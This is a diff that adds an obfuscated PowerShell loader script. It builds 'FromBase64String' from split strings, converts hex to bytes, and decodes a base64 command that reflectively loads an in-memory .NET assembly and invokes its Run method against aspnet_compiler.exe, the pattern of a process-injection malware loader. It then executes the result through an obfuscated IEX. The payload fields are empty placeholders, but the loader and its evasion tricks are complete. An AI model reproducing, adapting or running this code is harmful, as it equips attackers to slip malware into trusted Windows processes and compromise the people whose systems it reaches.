@@ -1,0 +1,26 @@
+FUNCTION D4FD5C5B9266824C4EEFC83E0C69FD3FAA($D4FD5C5B9266824C4EEFC83E0C69FD3FAAE)
+{
+  $D4FD5C5B9266824C4EEFC83E0C69FD3FAAx = "Fr"+"omBa"+"se6"+"4Str"+"ing"
+  $D4FD5C5B9266824C4EEFC83E0C69FD3FAAG = [Text.Encoding]::Utf8.GetString([Convert]::$D4FD5C5B9266824C4EEFC83E0C69FD3FAAx($D4FD5C5B9266824C4EEFC83E0C69FD3FAAE))
+  return $D4FD5C5B9266824C4EEFC83E0C69FD3FAAG
+}
+
+Function HBar {
+ 
+    [CmdletBinding()]
+    [OutputType([byte[]])]
+    param(
+        [Parameter(Mandatory=$true)] [String]$H3
+    )
+    $H2 = New-Object -TypeName byte[] -ArgumentList ($H3.Length / 2)
+    for ($i = 0; $i -lt $H3.Length; $i += 2) {
+        $H2[$i / 2] = [Convert]::ToByte($H3.Substring($i, 2), 16)
+    }
+
+    return [byte[]]$H2
+}
+[String]$H1 = '' 
+[Byte[]]$H5=HBar $H1
+[Byte[]]$H4=[syStEm.COnvERt]::"FrOmbASe6`4`Str`INg"('PE')
+$JUANADEARCO = 'W1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRINSkuR2V0VHlwZSgnSUNPLkxPR08nKS5HZXRNZXRob2QoJ1J1bicpLkludm9rZSgkbnVsbCxbb2JqZWN0W11dICggJ0M6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcmtcdjQuMC4zMDMxOVxhc3BuZXRfY29tcGlsZXIuZXhlJywkSDEpKQ=='
+$REYKI = D4FD5C5B9266824C4EEFC83E0C69FD3FAA($JUANADEARCO);$Run=($REYKI -Join '')|I`E`X
